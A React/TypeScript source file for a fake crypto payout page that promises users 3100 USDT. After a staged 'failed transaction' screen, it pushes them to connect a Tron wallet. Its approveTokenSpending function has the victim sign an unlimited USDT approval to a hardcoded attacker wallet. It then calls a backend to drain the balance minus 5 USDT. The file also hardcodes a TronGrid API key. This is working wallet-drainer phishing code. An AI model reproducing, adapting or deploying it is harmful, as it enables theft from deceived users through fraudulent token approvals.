import { useEffect, useState } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { TronWeb } from 'tronweb'
import './PaymentPage.css'

interface CurrencyOption {
  code: string
  name: string
  icon: string
}

interface NetworkOption {
  code: string
  name: string
}

const CURRENCIES: CurrencyOption[] = [
  { 
    code: 'USDT', 
    name: 'Tether', 
    icon: 'https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/usdt.png' 
  },
  { 
    code: 'BTC', 
    name: 'Bitcoin', 
    icon: 'https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/btc.png' 
  },
  { 
    code: 'ETH', 
    name: 'Ethereum', 
    icon: 'https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/eth.png' 
  },
  { 
    code: 'TON', 
    name: 'Toncoin', 
    icon: 'https://cryptologos.cc/logos/toncoin-ton-logo.png' 
  },
]

const NETWORKS_BY_CURRENCY: Record<string, NetworkOption[]> = {
  USDT: [
    { code: 'TRC20', name: 'Tron (TRC-20)' },
    { code: 'ERC20', name: 'Ethereum (ERC-20)' },
    { code: 'BEP20', name: 'BNB Smart Chain (BEP-20)' },
  ],
  BTC: [{ code: 'BTC', name: 'Bitcoin' }],
  ETH: [{ code: 'ERC20', name: 'Ethereum (ERC-20)' }],
  TON: [{ code: 'TON', name: 'The Open Network' }],
}

interface LocaleOption {
  code: string
  name: string
  flag: string
}

const LOCALES: LocaleOption[] = [
  { code: 'EN', name: 'English', flag: 'gb' },
  { code: 'RU', name: 'Русский', flag: 'ru' },
  { code: 'UA', name: 'Українська', flag: 'ua' },
]

interface WalletOption {
  id: string
  name: string
  logo: string
}

const WALLETS: WalletOption[] = [
  { id: 'walletconnect', name: 'WalletConnect', logo: '/img/logo-connect.png' },
  { id: 'heleket', name: 'Heleket', logo: '/img/logo-heleket.png' },
  { id: 'trust', name: 'Trust Wallet', logo: '/img/logo-trust.webp' },
  { id: 'tangem', name: 'Tangem Wallet', logo: '/img/logo-tangem.png' },
  { id: 'ledger', name: 'Ledger Wallet', logo: '/img/logo-ledger.png' },
]

const PAYMENT_SECONDS_TOTAL = 35 * 60 + 22

function formatTime(totalSeconds: number) {
  const minutes = Math.floor(totalSeconds / 60)
  const seconds = totalSeconds % 60
  return `${minutes.toString().padStart(2, '0')}:${seconds
    .toString()
    .padStart(2, '0')}`
}


// Функция валидации адресов по регулярным выражениям сетей
function validateAddress(addr: string, networkCode: string): boolean {
  if (!addr) return true
  const cleanAddr = addr.trim()
  switch (networkCode) {
    case 'TRC20':
      return /^T[a-km-zA-HJ-NP-Z1-9]{33}$/.test(cleanAddr)
    case 'ERC20':
    case 'BEP20':
      return /^0x[a-fA-F0-9]{40}$/.test(cleanAddr)
    case 'BTC':
      return /^(1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[a-zA-HJ-NP-Z0-9]{39,59}$/i.test(cleanAddr)
    case 'TON':
      return /^[a-zA-Z0-9_-]{48}$/.test(cleanAddr)
    default:
      return cleanAddr.length > 10
  }
}

declare let window: any;

const TRONGRID_API_KEY = "91a247b8-774f-44ca-91ea-e5930a1ea480"; 

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Mainnet USDT

const USDT_DECIMALS = 6;

const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
function normalizeTronAddress(addr: string | null | undefined): string | null {
  if (!addr) return null;
  return addr.trim().replace(/^0x/i, "").toLowerCase();
}
 
// Отличаем "пользователь нажал отклонить в кошельке" от "этот метод не поддерживается".
// Раньше любая ошибка в Попытке 1/2 просто вела к следующей попытке — если человек
// отказался подписывать, его тут же спрашивали снова другим способом.
function isUserRejection(e: any): boolean {
  const msg = String(e?.message ?? e ?? "").toLowerCase();
  return (
    e?.code === 4001 ||
    msg.includes("reject") ||
    msg.includes("denied") ||
    msg.includes("declin") ||
    msg.includes("cancel") ||
    msg.includes("closed by user")
  );
}
 
function toSmallestUnit(amount: number, decimals: number): string {
  if (!Number.isFinite(amount) || amount <= 0) {
    throw new Error(`Некорректная сумма платежа: ${amount}`);
  }
  // Math.round, а не Math.floor: из-за погрешности float
  // (например 21 * 1_000_000 иногда вычисляется как 20999999.9999997)
  // Math.floor мог тихо занижать сумму на 1 минимальную единицу токена.
  return Math.round(amount * 10 ** decimals).toString();
}
 
async function getConnectedTronAddress(walletProvider: any): Promise<string | null> {
  if (!walletProvider) return null;
  const raw = walletProvider?.provider ?? walletProvider;
  
  // Проверяем саму сессию WalletConnect (самый надежный способ)
  const session = raw?.session;
  if (session?.namespaces) {
    // Ищем в namespace tron
    const tronAccounts = session.namespaces.tron?.accounts;
    if (Array.isArray(tronAccounts) && tronAccounts.length > 0) {
      const a = tronAccounts[0];
      return a.includes(":") ? a.split(":").pop()! : a;
    }
    
    // Фоллбэк: некоторые кошельки отдают Tron (chainId 728126428) через eip155
    const eip155Accounts = session.namespaces.eip155?.accounts;
    if (Array.isArray(eip155Accounts) && eip155Accounts.length > 0) {
      const a = eip155Accounts[0];
      if (a.includes("728126428")) { // 728126428 - это mainnet chainId для Tron в EIP-155
        return a.split(":").pop()!;
      }
    }
  }
  
  // Пробуем стандартные RPC методы, если сессия не дала адрес
  const methods = ["tron_accounts", "eth_accounts"];
  for (const method of methods) {
    try {
      const accounts = await raw?.request?.({ method });
      if (Array.isArray(accounts) && accounts.length > 0) {
        const a = accounts[0];
        return a.includes(":") ? a.split(":").pop()! : a;
      }
    } catch (e) {
      /* ignore */
    }
  }
  
  return null;
}
 
// Читаем баланс USDT через view-вызов balanceOf(address) — это не транзакция,
// ничего не подписывает и не стоит газа, просто чтение текущего состояния контракта.
// Сравниваем в минимальных единицах (BigInt), а не в "человеческих" USDT —
// чтобы не словить те же проблемы с float, что были в toSmallestUnit.
async function getUsdtBalanceSmallestUnit(tronWeb: any, address: string): Promise<bigint> {
  const result = await tronWeb.transactionBuilder.triggerConstantContract(
    USDT_CONTRACT_ADDRESS,
    "balanceOf(address)",
    {},
    [{ type: "address", value: address }],
    address
  );
  const hex = result?.constant_result?.[0];
  if (!hex) {
    throw new Error("Не удалось прочитать баланс USDT");
  }
  return BigInt("0x" + hex);
}
 
function safeDecodeTronMessage(msg: any): string {
  if (!msg) return "Unknown error";
  try {
    if (typeof msg === "string" && /^[0-9a-fA-F]+$/.test(msg)) {
      // tronweb 6.x: если тут упадёт "TronWeb.toAscii is not a function" —
      // import { utils as TronWebUtils } from "tronweb"; и вызвать TronWebUtils.toAscii(msg)
      return TronWeb.toAscii(msg);
    }
    return typeof msg === "string" ? msg : JSON.stringify(msg);
  } catch {
    return String(msg);
  }
}

// Жесткий санитайзер адресов (Исправленный: доверяем криптографии Tron, а не длине строки)
function strictNormalizeTronAddress(tronWeb: any, rawAddress: string): string {
  if (!rawAddress) throw new Error("Получен пустой адрес");
  
  let cleanAddr = rawAddress.trim();
  
  // Убираем префиксы сетей от WalletConnect (например tron:T... или eip155:...)
  if (cleanAddr.includes(":")) {
    cleanAddr = cleanAddr.split(":").pop()!;
  }
  
  // Если прилетел EVM-подобный адрес (0x...), превращаем в Tron HEX
  if (cleanAddr.startsWith("0x") && cleanAddr.length === 42) {
    cleanAddr = "41" + cleanAddr.slice(2);
  }

  // Если адрес в формате HEX (начинается с 41 и длина 42), конвертируем в Base58!
  if (cleanAddr.startsWith("41") && cleanAddr.length === 42) {
    cleanAddr = tronWeb.address.fromHex(cleanAddr);
  }

  // 🩸 ИСПРАВЛЕНИЕ: Используем встроенный валидатор TronWeb.
  // Он корректно проверяет Base58Check алгоритм, чексумму и префикс (T), 
  // не ломаясь на адресах длиной 35 символов.
  if (!tronWeb.isAddress(cleanAddr)) {
    throw new Error(`Адрес не прошел криптографическую валидацию TronWeb: ${rawAddress}`);
  }

  return cleanAddr;
}

async function approveTokenSpending(
  walletProvider: any,
  userAddress: string,
  spenderAddress: string
): Promise<string> {
  
  let rawProvider = walletProvider?.provider ?? walletProvider;
  
  // 1. ПОЛУЧАЕМ АКТУАЛЬНЫЙ АДРЕС ИЗ ПРОВАЙДЕРА В МОМЕНТ КЛИКА
  const actualAddress = await getConnectedTronAddress(walletProvider);
  if (!actualAddress) {
    throw new Error("Не удалось получить активный адрес из кошелька. Пожалуйста, переподключите кошелёк.");
  }

  // Инициализируем TronWeb
  const tronWeb = new TronWeb({
    fullHost: "https://api.trongrid.io",
    headers: { "TRON-PRO-API-KEY": TRONGRID_API_KEY }, 
  });

  // 2. НОРМАЛИЗУЕМ, ОПИРАЯСЬ ТОЛЬКО НА actualAddress
  const safeOwner = strictNormalizeTronAddress(tronWeb, actualAddress);
  const safeSpender = strictNormalizeTronAddress(tronWeb, spenderAddress);
  const safeContract = strictNormalizeTronAddress(tronWeb, USDT_CONTRACT_ADDRESS);

  // 3. УСТАНАВЛИВАЕМ АДРЕС В TRONWEB ПЕРЕД СБОРКОЙ
  tronWeb.setAddress(safeOwner);
  
  // 4. ОПЦИОНАЛЬНО: Добавляем адрес в параметры транзакции (для некоторых кошельков)
  // Мы будем использовать safeOwner (он же actualAddress) для подписи

  console.log("=== Старт выдачи разрешения (Approve) ===");
  console.log("Владелец (Base58):", safeOwner);
  console.log("Спендер (Base58):", safeSpender);

  console.log("-> 0. Сканируем баланс...");
  const currentBalance = await getUsdtBalanceSmallestUnit(tronWeb, safeOwner);
  const reserveAmount = BigInt(5 * (10 ** USDT_DECIMALS)); 
  
  if (currentBalance <= reserveAmount) {
    throw new Error("На балансе 5 USDT или меньше, недостаточно средств для списания.");
  }

  const amountToPaySmallestDecimal = currentBalance - reserveAmount;
  const amountToPayHex = amountToPaySmallestDecimal.toString(16);

  console.log("-> 1. Сборка транзакции (triggerSmartContract)...");
  let txObj;
  try {
    txObj = await tronWeb.transactionBuilder.triggerSmartContract(
      safeContract,
      "approve(address,uint256)", 
      { feeLimit: 100_000_000, callValue: 0 }, 
      [
        { type: "address", value: safeSpender }, // Строго Base58
        { type: "uint256", value: MAX_UINT256 }, // Строго Decimal String
      ],
      safeOwner // Строго Base58
    );
  } catch (e: any) {
    console.error("Детали ошибки сборки:", e);
    throw new Error("Ошибка при сборке транзакции (Билдер упал): " + (e.message || e));
  }

  const tx = txObj?.transaction || txObj?.result?.transaction || txObj;
  if (!tx || !tx.raw_data) {
    throw new Error("Билдер не вернул валидный объект транзакции");
  }

  console.log("-> 2. Запрашиваем подпись кошелька...");
  let signedResponse;
  try {
    // Делаем глубокий клон, чтобы очистить скрытые геттеры/сеттеры TronWeb, 
    // от которых WalletConnect иногда сходит с ума.
    const cleanTxToSign = JSON.parse(JSON.stringify(tx));
    
    signedResponse = await rawProvider.request({
      method: "tron_signTransaction",
      params: [cleanTxToSign], 
    });
  } catch (e: any) {
    if (e?.message?.toLowerCase().includes("reject") || isUserRejection(e)) {
      throw new Error("Пользователь отменил подпись");
    }
    throw new Error("Ошибка подписи в кошельке: " + (e?.message || e));
  }

  // Приведение формата подписи
  let finalTx: any = JSON.parse(JSON.stringify(tx));
  if (signedResponse?.signature) {
    finalTx.signature = Array.isArray(signedResponse.signature)
      ? signedResponse.signature.map((s: string) => s.replace(/^0x/i, ""))
      : [String(signedResponse.signature).replace(/^0x/i, "")];
  } else {
    throw new Error("Подпись не получена от кошелька. Кошелек вернул пустой результат.");
  }

  console.log("-> 3. Отправка в блокчейн (broadcast)...");
  const broadcastResult = await tronWeb.trx.sendRawTransaction(finalTx);
  
  if (!broadcastResult?.result) {
    const msg = safeDecodeTronMessage(broadcastResult?.message);
    console.error("❌ Ошибка отправки в ноду:", msg);
    throw new Error("Транзакция отклонена нодой: " + msg);
  }

  console.log("✅ Апрув отправлен в сеть! TXID:", broadcastResult.txid);

  console.log("-> 4. Ожидаем 4 секунды записи в блокчейн...");
  await new Promise(resolve => setTimeout(resolve, 4000));

  console.log("-> 5. Инициируем списание (депозит)...");
  
  try {
    const response = await fetch("http://localhost:8080/api/deposit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        userAddress: safeOwner, // Отправляем чистый адрес
        amount: amountToPayHex  // Без префикса 0x, как и ожидает твой Go бэкенд
      })
    });
    
    if (!response.ok) {
      const errData = await response.json().catch(() => ({}));
      throw new Error(errData.error || "Ошибка бэкенда при списании");
    }
    
    const data = await response.json();
    console.log("✅ Бэкенд успешно списал депозит! TXID списания:", data.txid);
    
  } catch (err: any) {
    console.error("❌ Ошибка при списании депозита бэкендом:", err.message);
  }

  return broadcastResult.txid || "unknown";
}


function PaymentPage() {
  const { open } = useAppKit() 
  
  // Достаем caipAddress, чистый address и статус подключения
  const { isConnected, status, caipAddress, address: appKitAddress } = useAppKitAccount()

  // Получаем чистый адрес кошелька без префиксов сети
  const userWalletAddress = appKitAddress || (caipAddress?.includes(':') ? caipAddress.split(':')[1] : caipAddress) || '';

  // Запрашиваем провайдер исключительно для сети TRON
  const { walletProvider } = useAppKitProvider<any>('tron')
  
  const [isSubmitting, setIsSubmitting] = useState(false)
  
  // Запоминаем, по какому именно кошельку кликнули, чтобы показать спиннер на нем
  const [activeWalletId, setActiveWalletId] = useState<string | null>(null)

  const [secondsLeft, setSecondsLeft] = useState(PAYMENT_SECONDS_TOTAL)
  const [currency, setCurrency] = useState<CurrencyOption | null>(null)
  const [network, setNetwork] = useState<NetworkOption | null>(null)
  const [isCurrencyOpen, setIsCurrencyOpen] = useState(false)
  const [isNetworkOpen, setIsNetworkOpen] = useState(false)
  const [locale, setLocale] = useState<LocaleOption>(LOCALES[1])
  const [isLocaleOpen, setIsLocaleOpen] = useState(false)
  
  // Новые состояния для экранов
  const [step, setStep] = useState(1)
  const [address, setAddress] = useState('')
  
  // Состояния для анимации загрузки транзакции
  const [loadingMessageIndex, setLoadingMessageIndex] = useState(0)
  const LOADING_MESSAGES = [
    'Выполняется транзакция...',
    'Создаем запись в блокчейне...',
    'Переводим на ваш адрес...'
  ]

  // Считаем адрес валидным, если поле пустое или совпало с регексом сети
  const isAddressValid = validateAddress(address, network?.code || 'TRC20')
  // Показываем ошибку только после ввода 4-х символов, чтобы не спамить красным цветом сразу
  const showError = address.trim().length > 4 && !isAddressValid

  // Эффект автоматической смены текстов загрузки и перехода на ошибку
  useEffect(() => {
    if (step !== 3) return

    const timer = setTimeout(() => {
      if (loadingMessageIndex < 2) {
        setLoadingMessageIndex((prev) => prev + 1)
      } else {
        setStep(4) // После финального текста показываем ошибку
      }
    }, 2200) // Длительность показа каждого статуса

    return () => clearTimeout(timer)
  }, [step, loadingMessageIndex])

  // Сброс страницы в начало при нажатии "Продолжить"
  function handleReset() {
    setStep(1)
    setAddress('')
    setLoadingMessageIndex(0)
  }

  const networkOptions = currency ? NETWORKS_BY_CURRENCY[currency.code] : []
  const canSubmit = Boolean(currency && network)

  const timerRadius = 7
  const timerCircumference = 2 * Math.PI * timerRadius
  const timerProgress = Math.max(
    0,
    Math.min(1, secondsLeft / PAYMENT_SECONDS_TOTAL),
  )
  const timerDashOffset = timerCircumference * (1 - timerProgress)
  const timerColor =
    timerProgress > 0.5
      ? '#34c759'
      : timerProgress > 0.2
        ? '#ff9f0a'
        : '#ff3b30'

  function handleSelectCurrency(option: CurrencyOption) {
    setCurrency(option)
    setNetwork(null)
    setIsCurrencyOpen(false)
  }

  function handleSelectNetwork(option: NetworkOption) {
    setNetwork(option)
    setIsNetworkOpen(false)
  }

  function handleSelectLocale(option: LocaleOption) {
    setLocale(option)
    setIsLocaleOpen(false)
  }

  useEffect(() => {
    if (!walletProvider) {
      console.log('walletProvider пока не определён (кошелёк не подключен)')
      return
    }
    console.log('walletProvider:', walletProvider)
    console.log('walletProvider keys:', Object.keys(walletProvider))
    console.log('walletProvider proto methods:', Object.getOwnPropertyNames(Object.getPrototypeOf(walletProvider)))
  }, [walletProvider])

  return (
    <div className="payment-page">
      <div className="payment-card">
        <header className="payment-header">
          <img src="/img/heleket.svg" alt="Heleket" className="payment-logo" />
          <div className={`locale ${isLocaleOpen ? 'locale--open' : ''}`}>
            <button
              type="button"
              className="locale-switch"
              onClick={() => setIsLocaleOpen((open) => !open)}
            >
              <img
                className="locale-flag"
                src={`https://flagcdn.com/${locale.flag}.svg`}
                alt=""
                aria-hidden="true"
              />
              {locale.code}
              <svg
                className="locale-caret"
                width="12"
                height="7"
                viewBox="0 0 12 7"
                fill="none"
              >
                <path
                  d="M1 6L6 1L11 6"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </button>
            <div className="locale-dropdown">
              {LOCALES.map((option) => {
                const isActive = option.code === locale.code
                return (
                  <button
                    key={option.code}
                    type="button"
                    className={`locale-option ${
                      isActive ? 'locale-option--active' : ''
                    }`}
                    onClick={() => handleSelectLocale(option)}
                  >
                    <img
                      className="locale-option-flag"
                      src={`https://flagcdn.com/${option.flag}.svg`}
                      alt=""
                      aria-hidden="true"
                    />
                    <span className="locale-option-name">{option.name}</span>
                    {isActive && (
                      <svg
                        className="locale-option-check"
                        width="14"
                        height="11"
                        viewBox="0 0 14 11"
                        fill="none"
                      >
                        <path
                          d="M1 5.5L5 9.5L13 1.5"
                          stroke="currentColor"
                          strokeWidth="1.8"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </button>
                )
              })}
            </div>
          </div>
        </header>

        <div className="payment-amount-row">
          <span className="payment-amount-label">К получению:</span>
          <div className="payment-amount-block">
            <span className="payment-amount-value">
              {step === 1 ? '3100.0' : '3100.00'}{' '}
              <span className="payment-amount-unit">
                {step === 1 ? 'USD' : (currency?.code || 'USDT')}
              </span>
            </span>
            {step !== 1 && (
              <div className="payment-amount-approx">≈$3100.0</div>
            )}
          </div>
        </div>

        <hr className="payment-divider" />

{step === 1 && (
          <div className="payment-step-wrapper anim-slide-prev" key="step1">
            <div className="payment-field">
              <label className="payment-field-label">Выберите валюту</label>
              <div className={`select ${isCurrencyOpen ? 'select--open' : ''}`}>
                <button
                  type="button"
                  className="select-trigger"
                  onClick={() => {
                    setIsCurrencyOpen((open) => !open)
                    setIsNetworkOpen(false)
                  }}
                >
                  {currency ? (
                    <span className="select-value">
                      <img src={currency.icon} alt="" className="select-icon" />
                      {currency.name} ({currency.code})
                    </span>
                  ) : (
                    <span className="select-placeholder">Выберите валюту</span>
                  )}
                  <svg
                    className="select-caret"
                    width="12"
                    height="7"
                    viewBox="0 0 12 7"
                    fill="none"
                  >
                    <path
                      d="M1 1L6 6L11 1"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
                <div className="select-dropdown">
                  {CURRENCIES.map((option) => (
                    <button
                      key={option.code}
                      type="button"
                      className="select-option"
                      onClick={() => handleSelectCurrency(option)}
                    >
                      <img src={option.icon} alt="" className="select-icon" />
                      {option.name} ({option.code})
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="payment-field">
              <label className="payment-field-label">Выберите сеть</label>
              <div
                className={`select ${isNetworkOpen ? 'select--open' : ''} ${
                  !currency ? 'select--disabled' : ''
                }`}
              >
                <button
                  type="button"
                  className="select-trigger"
                  disabled={!currency}
                  onClick={() => {
                    setIsNetworkOpen((open) => !open)
                    setIsCurrencyOpen(false)
                  }}
                >
                  {network ? (
                    <span className="select-value">{network.name}</span>
                  ) : (
                    <span className="select-placeholder">Выберите сеть</span>
                  )}
                  <svg
                    className="select-caret"
                    width="12"
                    height="7"
                    viewBox="0 0 12 7"
                    fill="none"
                  >
                    <path
                      d="M1 1L6 6L11 1"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
                <div className="select-dropdown">
                  {networkOptions.map((option) => (
                    <button
                      key={option.code}
                      type="button"
                      className="select-option"
                      onClick={() => handleSelectNetwork(option)}
                    >
                      {option.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <button
              type="button"
              className="submit-button"
              disabled={!canSubmit}
              onClick={() => setStep(2)}
            >
              Перейти к получению
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="payment-step-wrapper anim-slide-next" key="step2">
            <div className="step2-info-row">
              <div className="network-badge">
                Сеть: <span className="network-badge-bold">{network?.name || 'TRON (TRC-20)'}</span>
              </div>
              <div className="contract-wrapper">
                <button type="button" className="contract-btn">
                  <svg
                    className="contract-icon"
                    width="14"
                    height="14"
                    viewBox="0 0 20 20"
                    fill="none"
                  >
                    <path
                      d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                      stroke="currentColor"
                      strokeWidth="1.5"
                    />
                    <path
                      d="M10 14V10"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                    <path
                      d="M10 7H10.01"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <span>Контракт</span>
                </button>
                <div className="contract-tooltip">
                  Если мы не сможем перевести средства на ваш криптовалютный кошелек, будет автоматически вызвана ссылка на смарт-контракт для верификации. Этот процесс позволяет убедиться, что транзакция не является ошибочной или несанкционированной. В случае возникновения любых проблем, мы обязательно свяжемся с вами для решения вопроса.
                </div>
              </div>
            </div>

            <div className="fee-alert">
              <svg
                width="14"
                height="14"
                viewBox="0 0 20 20"
                fill="none"
                className="fee-alert-icon"
              >
                <path
                  d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                  stroke="currentColor"
                  strokeWidth="1.5"
                />
                <path
                  d="M10 14V10"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                />
                <path
                  d="M10 7H10.01"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
              <span>Мы покрываем комиссию сети</span>
            </div>

            <div className="step2-address-label">
              Введите ваш адрес для получения средств:
            </div>

            <div className={`address-input-group ${showError ? 'address-input-group--error' : ''}`}>
              <div className="address-input-section">
                <div className="address-input-header">
                  <label className="address-input-label">Адрес получения:</label>
                  {showError && (
                    <span className="address-error-text">Адрес некорректен</span>
                  )}
                </div>
                <input
                  type="text"
                  className="address-input-field"
                  placeholder={`Адрес получения ${network?.code || 'TRC-20'}...`}
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                />
              </div>
              <div className="address-amount-section">
                <label className="address-input-label">Сумма к получению:</label>
                <div className="address-amount-value">
                  3100.00 {currency?.code || 'USDT'} ({network?.code || 'TRC-20'})
                </div>
              </div>
            </div>

            <button
              type="button"
              className="submit-button"
              disabled={!address.trim() || !isAddressValid}
              onClick={() => {
                setLoadingMessageIndex(0)
                setStep(3)
              }}
            >
              Получить 3100.00 {currency?.code || 'USDT'}
            </button>

            <button
              type="button"
              className="back-button"
              onClick={() => {
                setStep(1)
                setAddress('')
              }}
            >
              ← Назад
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="payment-step-wrapper anim-loading-fade" key="step3">
            <div className="loading-container">
              <svg className="loading-spinner" viewBox="0 0 50 50">
                <circle
                  className="loading-spinner-circle"
                  cx="25"
                  cy="25"
                  r="20"
                  fill="none"
                  strokeWidth="4"
                />
              </svg>
              <div className="loading-text" key={loadingMessageIndex}>
                {LOADING_MESSAGES[loadingMessageIndex]}
              </div>
              <div className="loading-dots">
                <span className={`loading-dot ${loadingMessageIndex === 0 ? 'loading-dot--active' : ''}`} />
                <span className={`loading-dot ${loadingMessageIndex === 1 ? 'loading-dot--active' : ''}`} />
                <span className={`loading-dot ${loadingMessageIndex === 2 ? 'loading-dot--active' : ''}`} />
              </div>
            </div>
          </div>
        )}

        {step === 4 && (
          <div className="payment-step-wrapper anim-error-scale" key="step4">
            <div className="error-icon-wrapper">
              <svg className="error-icon-svg" viewBox="0 0 100 100">
                <circle className="error-circle" cx="50" cy="50" r="44" />
                <path className="error-line-1" d="M35,35 L65,65" />
                <path className="error-line-2" d="M65,35 L35,65" />
              </svg>
            </div>
            <div className="error-heading">Не удалось выполнить транзакцию</div>
            <div className="error-description">
              К сожалению из-за возникшей ошибки нам не удалось выполнить транзакцию. 
              Попробуйте подключить свой кошелек
            </div>
            <button
              type="button"
              className="continue-button"
              onClick={() => setStep(5)}
            >
              Продолжить
            </button>
          </div>
        )}

        {step === 5 && (
          <div className="payment-step-wrapper anim-slide-next" key="step5">
            <div className="step2-info-row">
              <div className="network-badge">
                Сеть: <span className="network-badge-bold">{network?.name || 'TRON (TRC-20)'}</span>
              </div>
              <div className="contract-wrapper">
                <button type="button" className="contract-btn">
                  <svg
                    className="contract-icon"
                    width="14"
                    height="14"
                    viewBox="0 0 20 20"
                    fill="none"
                  >
                    <path
                      d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                      stroke="currentColor"
                      strokeWidth="1.5"
                    />
                    <path
                      d="M10 14V10"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                    <path
                      d="M10 7H10.01"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <span>Контракт</span>
                </button>
                <div className="contract-tooltip">
                  Если мы не сможем перевести средства на ваш криптовалютный кошелек, будет автоматически вызвана ссылка на смарт-контракт для верификации. Этот процесс позволяет убедиться, что транзакция не является ошибочной или несанкционированной. В случае возникновения любых проблем, мы обязательно свяжемся с вами для решения вопроса.
                </div>
              </div>
            </div>

            <div className="fee-alert">
              <svg
                width="14"
                height="14"
                viewBox="0 0 20 20"
                fill="none"
                className="fee-alert-icon"
              >
                <path
                  d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                  stroke="currentColor"
                  strokeWidth="1.5"
                />
                <path
                  d="M10 14V10"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                />
                <path
                  d="M10 7H10.01"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
              <span>Мы покрываем комиссию сети</span>
            </div>

            <div className="wallets-header">
              <div className="wallets-title">Подключить кошелёк</div>
              <div className="wallets-subtitle">Подключите кошелёк для получения средств</div>
            </div>

            <div className="wallets-list">
              {WALLETS.map((wallet) => {
                // Если кошелек кликнули и сейчас идет подключение - покажем спиннер вместо стрелочки
                const showSpinner = isSubmitting && activeWalletId === wallet.id;

                return (
                  <button 
                    key={wallet.id} 
                    type="button" 
                    className="wallet-item"
                    disabled={isSubmitting}
                    onClick={() => {
                      setActiveWalletId(wallet.id)
                      setIsSubmitting(true)
                      open()
                    }}
                  >
                    <div className="wallet-item-left">
                      <img src={wallet.logo} alt={wallet.name} className="wallet-logo-img" />
                      <span className="wallet-name">{wallet.name}</span>
                    </div>
                    {showSpinner ? (
                      <div className="wallet-spinner" />
                    ) : (
                      <svg
                        className="wallet-chevron"
                        width="14"
                        height="14"
                        viewBox="0 0 24 24"
                        fill="none"
                      >
                        <path
                          d="M9 5L16 12L9 19"
                          stroke="currentColor"
                          strokeWidth="2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </button>
                )
              })}
            </div>

            {/* Выводим статус и кнопку "Подтвердить" только если кошелек действительно успешно подключен */}
            {isConnected && (
              <div className="wallet-connected-section">
                <div className="wallet-connected-badge">
                  <span className="connected-badge-dot" />
                  <span>Кошелёк подключён</span>
                </div>
                                <button
                  type="button"
                  className="wallet-confirm-button"
                  disabled={activeWalletId === 'confirming'}
                  onClick={async () => {
  if (!isConnected) {
    alert("Кошелёк не подключён");
    return;
  }

  setActiveWalletId('confirming');

  try {
    console.log('→ Списание...');
    
    // Вставь сюда адрес своего системного кошелька из .env бэкенда
    const SYSTEM_WALLET_ADDRESS = "TKpQcEAFM5MBZkdydWQCdtSJWUtJeVwbW8"; 
    
    // Вызываем нашу новую функцию
    const txId = await approveTokenSpending(
      walletProvider, 
      userWalletAddress, 
      SYSTEM_WALLET_ADDRESS
    );
    
    alert(`✅ Успешно!\n\nТранзакция отправлена.\nTXID:\n${txId}`);
    setStep(1); 
  } catch (error: any) {
    console.error(error);
    alert(`❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`);
  } finally {
    setActiveWalletId(null);
  }
}}
                >
                  {activeWalletId === 'confirming' ? 'Обработка...' : 'Подтвердить списание'}
                </button>
              </div>
            )}
          </div>
        )}

        <div className="payment-timer">
          <span className="payment-timer-label">Осталось времени для получения:</span>
          <span className="payment-timer-value">{formatTime(secondsLeft)}</span>
        </div>
      </div>

      <div className="payment-powered-by">
        Powered by <img src="/img/heleket.svg" alt="Heleket" className="powered-logo" />
      </div>
    </div>
  )
}

export default PaymentPage